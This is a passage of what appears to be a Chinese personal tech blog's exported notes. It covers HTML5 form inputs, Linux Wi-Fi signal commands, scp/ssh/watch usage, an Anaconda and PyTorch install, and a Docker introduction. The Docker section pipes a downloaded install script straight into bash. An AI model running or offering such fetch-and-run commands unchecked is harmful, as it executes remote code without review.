<li>controls    controls    如果出现该属性，则向用户显示控件，比如播放按钮</li>
<li>loop    loop    如果出现该属性，则每当音频结束时重新开始播放</li>
<li>src    url    要播放的音频的url<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3></li>
<li>音频标签和视频标签使用方式基本一致</li>
<li>浏览器支持情况不同</li>
<li>谷歌浏览器把音频和视频自动播放禁止了</li>
<li>我们可以给视频标签添加muted属性来静音播放视频，音频不可以(可以通过JavaScript解决)</li>
<li>视频标签是重点，我们经常设置自动播放，不适用controls控件，循环和设置大小属性</li>
</ol>
<h3 id="新增input类型"><a href="#新增input类型" class="headerlink" title="新增input类型"></a>新增input类型</h3><table><thead><tr><th>属性值</th><th>说明</th></tr></thead><tbody><tr><td>type&#61;“email”</td><td>限制用户输入必须为Email类型</td></tr><tr><td>type&#61;“url”</td><td>限制用户输入必须为URL类型</td></tr><tr><td>type&#61;“data”</td><td>限制用户输入必须为日期类型</td></tr><tr><td>type&#61;“time”</td><td>限制用户输入必须为时间类型</td></tr><tr><td>type&#61;“month”</td><td>限制用户输入必须为月类型</td></tr><tr><td>type&#61;“week”</td><td>限制用户输入必须为周类型</td></tr><tr><td><strong>type&#61;&#34;number&#34;</strong></td><td><strong>限制用户输入必须为数字类型</strong></td></tr><tr><td><strong>type&#61;&#34;tel&#34;</strong></td><td><strong>手机号码</strong></td></tr><tr><td><strong>type&#61;&#34;search&#34;</strong></td><td><strong>搜索框</strong></td></tr><tr><td>type&#61;“color”</td><td>生成一个颜色选择表单</td></tr></tbody></table>

<p>重点记住： number tel search 这三个</p>
<body>
    <!-- 我们验证的时候必须添加form表单域 -->
    <form action="">
        <ul>
            <li>邮箱: <input type="email" /></li>
            <li>网址: <input type="url" /></li>
            <li>日期: <input type="date" /></li>
            <li>时间: <input type="time" /></li>
            <li>数量: <input type="number" /></li>
            <li>手机号码: <input type="tel" /></li>
            <li>搜索: <input type="search" /></li>
            <li>颜色: <input type="color" /></li>
            <!-- 当我们点击提交按钮就可以验证表单了 -->
            <li> <input type="submit" value="提交"></li>
        </ul>
    </form>
</body>

<h3 id="新增表单属性"><a href="#新增表单属性" class="headerlink" title="新增表单属性"></a>新增表单属性</h3><table><thead><tr><th>属性</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>required</td><td>表单拥有该属性表示其内容不能为空&#xff0c;必填</td></tr><tr><td><strong>placeholder</strong></td><td><strong>提示文本</strong></td><td><strong>表单的提示信息&#xff0c;存在默认值将不显示</strong></td></tr><tr><td>autofocus</td><td>autofocus</td><td>自动聚焦属性&#xff0c;页面加载完成自动聚焦到指定表单</td></tr><tr><td>autocomplete</td><td>off/on</td><td>当用户在字段开始键入时&#xff0c;浏览器基于之前键入过的值&#xff0c;应该显示出在字段中填写的选项&#xff0c;默认已经打开。如autocomplete&#61;“on” ,关闭autocomplete&#61;“off”&#xff0c;需要放在表单内&#xff0c;同时加上name属性&#xff0c;同时成功提交</td></tr><tr><td><strong>multiple</strong></td><td><strong>multiple</strong></td><td><strong>可以多选文件提示</strong></td></tr></tbody></table>

<pre class="line-numbers language-none"><code class="language-none">&lt;form action&#x3D;&quot;&quot;&gt;
        &lt;input type&#x3D;&quot;search&quot; name&#x3D;&quot;sear&quot; id&#x3D;&quot;&quot; required&#x3D;&quot;required&quot; placeholder&#x3D;&quot;kp&quot; autofocus&#x3D;&quot;autofocus&quot; autocommplete&#x3D;&quot;off&quot;&gt;
        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;
    &lt;&#x2F;form&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以通过以下设置方式修改placeholder里面的字体颜色<br><pre class="line-numbers language-none"><code class="language-none">input::placeholder &#123;
	color: pink;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
<form action="">
        <input type="search" name="sear" id="" required="required" placeholder="kp" autofocus="autofocus" autocommplete="off">
        <input type="submit" value="提交">
</form>

<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ul>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/115419453">HTML冲浪笔记(一)</a></li>
<li><a href="https://blog.csdn.net/Augenstern_QXL/article/details/115599059">HTML5冲浪笔记(二)</a></li>
</ul>
]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title>linux_rssi_信号强度获取</title>
    <url>/2021/07/13/linux-rssi-%E4%BF%A1%E5%8F%B7%E5%BC%BA%E5%BA%A6%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linuxrssi信号强度获取"><a href="#linuxrssi信号强度获取" class="headerlink" title="linuxrssi信号强度获取"></a>linux<em>rssi</em>信号强度获取</h1><h2 id="测试环境中，无线网卡的接口id为wlan0"><a href="#测试环境中，无线网卡的接口id为wlan0" class="headerlink" title="测试环境中，无线网卡的接口id为wlan0"></a>测试环境中，无线网卡的接口id为wlan0</h2><h2 id="一秒周期查看无线网卡信息"><a href="#一秒周期查看无线网卡信息" class="headerlink" title="一秒周期查看无线网卡信息"></a>一秒周期查看无线网卡信息</h2><p><code>watch -n 1 cat /proc/net/wireless</code></p>
<h2 id="获取信号强度："><a href="#获取信号强度：" class="headerlink" title="获取信号强度："></a>获取信号强度：</h2><p><code>cat /proc/net/wireless |grep wlan0 |awk &#39;&#123;print $3&#125;&#39;</code><br>70.</p>
<h2 id="获取信号质量：单位dBm"><a href="#获取信号质量：单位dBm" class="headerlink" title="获取信号质量：单位dBm"></a>获取信号质量：单位dBm</h2><p><code>cat /proc/net/wireless |grep wlan0 |awk &#39;&#123;print $4&#125;&#39;</code><br>-38.</p>
<h2 id="网口的背景噪声：单位dBm"><a href="#网口的背景噪声：单位dBm" class="headerlink" title="网口的背景噪声：单位dBm"></a>网口的背景噪声：单位dBm</h2><p><code>cat /proc/net/wireless |grep wlan0 |awk &#39;&#123;print $5&#125;&#39;</code></p>
<p>-256</p>
<h2 id="网口的传输速率：Mb-s-1000000bps"><a href="#网口的传输速率：Mb-s-1000000bps" class="headerlink" title="网口的传输速率：Mb/s = 1000000bps"></a>网口的传输速率：Mb/s = 1000000bps</h2><p><code>iwconfig wlan0 | sed &#39;s/ /\n/g&#39; | grep -i Rate | sed &#39;s/=/ /g&#39;|awk &#39;&#123;print $2&#125;&#39;</code></p>
<p>在程序中执行这些命令后需要获取返回结果，最简单的方法是，将命令行结果重定向到一个临时文件，然后读取这个临时文件，从而获得外部命令执行结果。</p>
<p>参考：</p>
<ul>
<li><a href="https://www.jb51.net/LINUXjishu/421311.html">Linux系统中iwconfig命令使用详解</a></li>
<li><a href="https://blog.csdn.net/lbyyy/article/details/51392629">无线信号强度解析及linux如何查看wifi信号强弱等</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux常用指令</title>
    <url>/2021/07/28/linux-ssh-scp%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux常用指令"><a href="#linux常用指令" class="headerlink" title="linux常用指令"></a>linux常用指令</h1><ul>
<li>保存ip地址<pre class="line-numbers language-none"><code class="language-none">sudo nano &#x2F;etc&#x2F;hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><pre class="line-numbers language-none"><code class="language-none">ssh name@ipname<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h2 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h2><pre class="line-numbers language-none"><code class="language-none">上传
scp -r 源地址 name@ipname:目的地址目录

下载
scp -r name@ipname:目的地址目录 源地址 
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>./ 当前目录<br>～  根目录</p>
<h3 id="压缩文件指令"><a href="#压缩文件指令" class="headerlink" title="压缩文件指令"></a>压缩文件指令</h3><pre class="line-numbers language-none"><code class="language-none">unzip 文件.zip
zip -r xxx.zip 文件目录
tar zxvf 文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><pre class="line-numbers language-none"><code class="language-none">ps -ef|grep python   #当前运行的程序PID

tail -f out.log    #持续看输出结果

cat     # 文件内容

pwd   # 当前文件地址

sudo passwd # 修改密码

watch

ifconfig  # 端口

iwconfig # 网卡信息

df -h  # 磁盘占用情况

ls -l  # 详细信息

cd # 进入某文件目录

rm -f filename

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h3><pre class="line-numbers language-none"><code class="language-none">scp -r name@ip:&#x2F;home&#x2F;wkp&#x2F;datasets&#x2F;targe&#x2F;images&#x2F;bz_3647.jpg &#x2F;home&#x2F;wkp&#x2F;wan_lab&#x2F;旋转扩充数据集&#x2F;YOLO_code&#x2F;img

scp -r wkp@xmu_1:&#x2F;home&#x2F;wkp&#x2F;datasets&#x2F;targe&#x2F;labels&#x2F;classes.txt &#x2F;home&#x2F;wkp&#x2F;wan_lab&#x2F;旋转扩充数据集&#x2F;YOLO_code&#x2F;label

scp -r wkp@xmu_1:&#x2F;home&#x2F;wkp&#x2F;datasets&#x2F;targe&#x2F;labels&#x2F;3647.txt &#x2F;home&#x2F;wkp&#x2F;wan_lab&#x2F;旋转扩充数据集&#x2F;YOLO_code&#x2F;label
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="wacth"><a href="#wacth" class="headerlink" title="wacth"></a>wacth</h4><pre class="line-numbers language-none"><code class="language-none">Usage: watch [-dhntv] [--differences[&#x3D;cumulative]] [--help] [--interval&#x3D;&lt;n&gt;] [--no-title] [--version] &lt;command&gt;
  -d, --differences[&#x3D;cumulative]        highlight changes between updates
                (cumulative means highlighting is cumulative)
  -h, --help                            print a summary of the options
  -n, --interval&#x3D;&lt;seconds&gt;              seconds to wait between updates
  -v, --version                         print the version number
  -t, --no-title                        turns off showing the header

每隔一秒高亮显示网络链接数的变化情况

watch -n 1 -d netstat -ant 【-n 设置间隔，-d,difference，高亮显示不同】
 
   watch -d &#39;ls &#x2F;home&#x2F;omd&#39;       【-d 高亮显示】
 
   watch -t &#39;ls &#x2F;home&#x2F;omd&#39;       【-t会关闭watch命令在顶部的时间间隔】

watch -n 1 -d &#39;pstree|grep http&#39;

实时查看模拟攻击客户机建立起来的连接数
 
watch -n 1 -d &#39;netstat -an | grep &quot;21&quot; | egrep &quot;192.168.25.100&quot;| wc -l&#39;
 
监测当前目录中 scf&#39; 的文件的变化
 
watch -d &#39;ls -l|grep scf&#39;
 
10秒一次输出系统的平均负载
 
watch -n 1 -d &quot;uptime&quot;


看网口连接状态
watch -n 1 iwconfig wlx0ccf89606c44

wlx0ccf89606c44  IEEE 802.11  ESSID:&quot;SSID&quot;  
          Mode:Managed  Frequency:2.462 GHz  Access Point: EC:26:CA:2A:01:E4   
          Bit Rate&#x3D;1 Mb&#x2F;s   Tx-Power&#x3D;20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality&#x3D;70&#x2F;70  Signal level&#x3D;-19 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:1  Invalid misc:10   Missed beacon:0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>目标检测</category>
      </categories>
      <tags>
        <tag>目标检测数据集扩充2</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下安装pytorch</title>
    <url>/2021/03/23/linux%E4%B8%8B%E5%AE%89%E8%A3%85pytorch/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux安装pytorch教程"><a href="#linux安装pytorch教程" class="headerlink" title="linux安装pytorch教程"></a><center>linux安装pytorch教程</center></h1><h2 id="安装Anaconda"><a href="#安装Anaconda" class="headerlink" title="安装Anaconda"></a>安装Anaconda</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>前往Anaconda官网进行下载，网址如下：<a href="https://www.anaconda.com/products/individual">https://www.anaconda.com/products/individual</a></p>
<p><img src="https://img-blog.csdnimg.cn/20210323104855666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>进入下载保存的目录，打开终端，根据我们下载好的版本输入安装命令：</p>
<p><code>bash Anaconda3-5.0.1-Linux-x86_64.sh</code></p>
<h3 id="conda环境配置"><a href="#conda环境配置" class="headerlink" title="conda环境配置"></a>conda环境配置</h3><h4 id="配置conda命令可以全局使用"><a href="#配置conda命令可以全局使用" class="headerlink" title="配置conda命令可以全局使用"></a>配置conda命令可以全局使用</h4><ol>
<li><p>刚安装anaconda环境完成时，conda命令是无法使用的，需要进行全局配置，配置方法如下：</p>
</li>
<li><p>vi或者vim命令编辑~/.bashrc文件，<br>输入a命令插入：<br><code>vim ~/.bashrc</code><br>在文件末尾添加如下内容：</p>
</li>
</ol>
<p><code>export PATH=&#39;anaconda的安装目录/bin:$PATH&#39;</code></p>
<ol>
<li>“ESC”退出编辑模式， “：”进入命令模式，输入wq!保存退出；如果无法推出使用shift+zz退出</li>
<li>让修改生效，执行命令：source ~/.bashrc<br>此时，再任意路径下都可以使用conda命令了，如下图：<br><img src="https://img-blog.csdnimg.cn/20210323105646753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h2 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h2>打开终端，输入</li>
</ol>
<p><code>conda create -n deeplearning python=3.6 pandas numpy matplotlib jupyter notebook</code></p>
<p>输入上面的代码后等待片刻</p>
<p>当创建虚拟环境成功之后，我们输入以下命令激活我们创建的环境</p>
<p><code>source activate deeplearning</code></p>
<p>安装PyTorch<br>在上一步激活环境后<br><code>source activate deeplearning</code></p>
<p>接下來，我們需要安裝PyTorch。</p>
<p>首先，我们进入Pytorch官网，在官网内，有一个PyTorch安装的环境选择，我是笔记本上的linux系统，所以我选择<br>Stable<br>OS：linux<br>Pip<br>Python<br>CPU<br><img src="https://img-blog.csdnimg.cn/20210323105902719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>终端在深度环境下输入<br><code>pip install torch==1.8.0+cpu torchvision==0.9.0+cpu torchaudio==0.8.0 -f https://download.pytorch.org/whl/torch_stable.html</code></p>
<h2 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h2><p>激活虚拟环境</p>
<p><code>source activate deeplearning</code></p>
<p>输入以下命令：</p>
<p><code>jupyter notebook</code></p>
<p>这个时候会自动打开一个网页</p>
<p><img src="https://img-blog.csdnimg.cn/20210323105615719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>新建一个页面后输入以下内容进行允许，若相同则安装成功<br><img src="https://img-blog.csdnimg.cn/20210323104939624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>以上有一步骤如果操作失误容易出现问题，可以采用<br>在使用anaconda装python时，有时候路径可能没有加入到系统路径中，要手动加入：</p>
<h1 id="将anaconda的bin目录加入PATH，根据版本不同。确定anaconda的名字，如果是默认的，python3-7生成anaconda3"><a href="#将anaconda的bin目录加入PATH，根据版本不同。确定anaconda的名字，如果是默认的，python3-7生成anaconda3" class="headerlink" title="将anaconda的bin目录加入PATH，根据版本不同。确定anaconda的名字，如果是默认的，python3.7生成anaconda3"></a>将anaconda的bin目录加入PATH，根据版本不同。确定anaconda的名字，如果是默认的，python3.7生成anaconda3</h1><p><code>echo &#39;export PATH=&quot;~/anaconda3/bin:$PATH&quot;&#39;&gt;&gt;~/.bashrc</code></p>
<p>然后更新bashrc，即可立即生效，不用关机，source ~/.bashrc用来重启环境变量。</p>
<p><code>source ~/.bashrc</code></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>嵌入式开发</tag>
      </tags>
  </entry>
  <entry>
    <title>linux学习笔记</title>
    <url>/2021/03/26/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux操作系统学习笔记"><a href="#linux操作系统学习笔记" class="headerlink" title="linux操作系统学习笔记"></a><center>linux操作系统学习笔记</center></h1><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="linux常用命令"><a href="#linux常用命令" class="headerlink" title="linux常用命令"></a>linux常用命令</h2><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt=""></p>
<ul>
<li>系统启动必须：<br>/boot：存放的启动</li>
</ul>
<p>Linux 时使用的内核文件，包括连接文件以及镜像文件。</p>
<p>/etc：存放所有的系统需要的配置文件和子目录列表，更改目录下的文件可能会导致系统不能启动。</p>
<p>/lib：存放基本代码库（比如c++库），其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</p>
<p>/sys： 这是linux2.6内核的一个很大的变化。该目录下安装了2.6内核中新出现的一个文件系统 sysfs 。sysfs文件系统集成了下面3种文件系统的信息：针对进程信息的proc文件系统、针对设备的devfs文件系统以及针对伪终端的devpts文件系统。该文件系统是内核设备树的一个直观反映。当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中</p>
<ul>
<li>指令集合：</li>
</ul>
<p>/bin：存放着最常用的程序和指令</p>
<p>/sbin：只有系统管理员能使用的程序和指令。<br>外部文件管理：</p>
<p>/dev ：Device(设备)的缩写, 存放的是Linux的外部设备。注意：在Linux中访问设备和访问文件的方式是相同的。</p>
<p>/media：类windows的其他设备，例如U盘、光驱等等，识别后linux会把设备放到这个目录下。</p>
<p>/mnt：临时挂载别的文件系统的，我们可以将光驱挂载在/mnt/上，然后进入该目录就可以查看光驱里的内容了。<br>临时文件：</p>
<p>/run：是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 /var/run 目录，应该让它指向 run。</p>
<p>/lost+found：一般情况下<br>为空的，系统非法关机后，这里就存放一些文件。</p>
<p>/tmp：这个目录是用来存放一些临时文件的。</p>
<ul>
<li>账户：</li>
</ul>
<p>/root：系统管理员的用户主目录。</p>
<p>/home：用户的主目录，以用户的账号命名的。</p>
<p>/usr：用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p>
<p>/usr/bin：系统用户使用的应用程序与指令。</p>
<p>/usr/sbin：超级用户使用的比较高级的管理程序和系统守护程序。</p>
<p>/usr/src：内核源代码默认的放置目录。</p>
<ul>
<li>运行过程中要用：</li>
</ul>
<p>/var：存放经常修改的数据，比如程序运行的日志文件（/var/log 目录下）。</p>
<p>/proc：管理内存空间！虚拟的目录，是系统内存的映射，我们可以直接访问这个目录来，获取系统信息。这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件来做修改。<br>扩展用的：</p>
<p>/opt：默认是空的，我们安装额外软件可以放在这个里面。</p>
<p>/srv：存放服务启动后需要提取的数据（不用服务器就是空）</p>
<h3 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h3><ul>
<li><a href="https://blog.csdn.net/weixin_44895651/article/details/105289038?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161672253016780269872208%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161672253016780269872208&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_yy~default-1-105289038.first_rank_v2_pc_rank_v29&amp;utm_term=linux">Linux常用命令汇总</a></li>
<li><a href="https://blog.csdn.net/FollowMyFell/article/details/108117228">参考</a></li>
<li><a href="https://blog.csdn.net/ThinkWon/article/details/104588679?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161672253016780269872208%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161672253016780269872208&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_yy~default-2-104588679.first_rank_v2_pc_rank_v29&amp;utm_term=linux">linux面试题</a><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="Docker优点"><a href="#Docker优点" class="headerlink" title="Docker优点"></a>Docker优点</h2></li>
</ul>
<p>Docker 是一个用于开发，交付和运行应用程序的开放平台。Docker 使您能够将应用程序与基础架构分开，从而可以快速交付软件。借助 Docker，您可以与管理应用程序相同的方式来管理基础架构。通过利用 Docker 的方法来快速交付，测试和部署代码，您可以大大减少编写代码和在生产环境中运行代码之间的延迟。</p>
<h2 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h2><h3 id="Docker-包括三个基本概念"><a href="#Docker-包括三个基本概念" class="headerlink" title="Docker 包括三个基本概念:"></a>Docker 包括三个基本概念:</h3><ul>
<li>镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</li>
<li>容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li>
<li>仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。<br>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。</li>
</ul>
<p>Docker 容器通过 Docker 镜像来创建。</p>
<p>容器与镜像的关系类似于面向对象编程中的对象与类。</p>
<h2 id="Docker使用"><a href="#Docker使用" class="headerlink" title="Docker使用"></a>Docker使用</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><code>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</code></p>
<h3 id="Docker-Hello-World"><a href="#Docker-Hello-World" class="headerlink" title="Docker Hello World"></a>Docker Hello World</h3><p>Docker 允许你在容器内运行应用程序， 使用 docker run 命令来在容器内运行一个应用程序。</p>
<p>输出Hello world</p>
<p><code>runoob@runoob:~$ docker run ubuntu:15.10 /bin/echo &quot;Hello world&quot;</code></p>
<p><code>Hello world</code></p>
<h4 id="各个参数解析："><a href="#各个参数解析：" class="headerlink" title="各个参数解析："></a>各个参数解析：</h4><p><img src="https://pic4.zhimg.com/80/v2-0db8d8426beb695f4146cc3ea540037d_1440w.jpg?source=1940ef5c" alt=""></p>
<ul>
<li><p>docker: Docker 的二进制执行文件。</p>
</li>
<li><p>run: 与前面的 docker 组合来运行一个容器。</p>
</li>
<li><p>ubuntu:15.10 指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像。</p>
</li>
<li><p>/bin/echo “Hello world”: 在启动的容器里执行的命令</p>
</li>
</ul>
<p>以上命令完整的意思可以解释为：Docker 以 ubuntu15.10 镜像创建一个新容器，然后在容器里执行 bin/echo “Hello world”，然后输出结果。</p>
<h3 id="Docker运行交互式的容器"><a href="#Docker运行交互式的容器" class="headerlink" title="Docker运行交互式的容器"></a>Docker运行交互式的容器</h3><p>我们通过 docker 的两个参数 -i -t，让 docker 运行的容器实现”对话”的能力：</p>
<p><code>docker run -i -t ubuntu:15.10 /bin/bash</code></p>
<p>Docker就相当于操作系统上的集装箱，节约空间，提高程序运行速度。<br><img src="https://pic1.zhimg.com/80/5d2cabafe63f33389c8a5c8ae1e576bb_1440w.jpg?source=1940ef5c" alt=""></p>
<h3 id="Docker和虚拟机相比的优势"><a href="#Docker和虚拟机相比的优势" class="headerlink" title="Docker和虚拟机相比的优势"></a>Docker和虚拟机相比的优势</h3><p><img src="https://pic4.zhimg.com/80/v2-f6e6d28348d25e91e0c794e9b47a1de9_1440w.jpg?source=1940ef5c" alt=""></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>嵌入式开发</tag>
      </tags>
  </entry>
  <entry>
    <title>linux嵌入式开发_1</title>
    <url>/2020/07/30/linux%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a><strong>linux基础</strong></h1><h2 id="linux是什么？"><a href="#linux是什么？" class="headerlink" title="linux是什么？"></a>linux是什么？</h2><span id="more"></span>
<ul>
<li>linux是一款开源操作系统，开放了整组的调用接口给程序猿进行开发和使用。linux操作系统包含内核和系统调用，并不包含应用程序。由于linux的架构继承了unix良好传统，因此越来越多的开发者选择使用linux并为之设计了许多应用级软件。</li>
</ul>
<h2 id="开发环境的搭建"><a href="#开发环境的搭建" class="headerlink" title="开发环境的搭建"></a>开发环境的搭建</h2><ul>
<li>开发环境需要用到交叉开发模式，这一点书上有很详细的介绍，包括硬件环境和软件环境的构建都写的十分清楚，所以这篇文章主要是写一下我在中间遇到的一些问题以及解决方法。虚拟机的话我用的是Ubuntu18.04版本，安装虚拟机啥的网上资源很多，直接百度就行。</li>
</ul>
<h2 id="linux下的环境搭建"><a href="#linux下的环境搭建" class="headerlink" title="linux下的环境搭建"></a>linux下的环境搭建</h2><h3 id="1、修改Ubuntu的一些配置"><a href="#1、修改Ubuntu的一些配置" class="headerlink" title="1、修改Ubuntu的一些配置"></a>1、修改Ubuntu的一些配置</h3><ul>
<li><p>切换国内镜像源</p>
<p>&ensp;&ensp;&ensp;&ensp;&ensp; 在使用apt命令安装包时，因为系统自带下载源在国外服务器上，所以需要切换为国内镜像源才能提升下载速度。这里有一篇博客详细说明了如何直接根据终端命令修改其配置文件，从而达到修改下载源的目的.或者，，，，你也可以直接用Ubuntu的图形界面去修改，步骤如下： 显示应用程序-&gt;软件和更新-&gt;下载自主服务器改为其他，然后选择合适的镜像源就行了，这里我选择的是阿里的镜像源。</p>
</li>
<li><p>修改语言和设置汉语输入法</p>
<p>&ensp;&ensp;&ensp;&ensp;&ensp; 懒得写，直接贴别人博客了</p>
</li>
</ul>
<p>&ensp;&ensp;&ensp;&ensp;&ensp;<a href="https://blog.csdn.net/langshi_2011/article/details/78993781">Linux Ubuntu系统设置成中文语言</a></p>
<p>&ensp;&ensp;&ensp;&ensp;&ensp;<a href="https://blog.csdn.net/sparkstrike/article/details/81487271">Linux.Ubuntu.中文输入法设置</a></p>
]]></content>
      <categories>
        <category>程序设计</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>嵌入式开发</tag>
        <tag>鸟哥的私房菜学习</tag>
      </tags>
  </entry>
  <entry>
    <title>linux批量分发_运行_killcode</title>
    <url>/2021/11/08/linux%E6%89%B9%E9%87%8F%E5%88%86%E5%8F%91-%E8%BF%90%E8%A1%8C-killcode/</url>
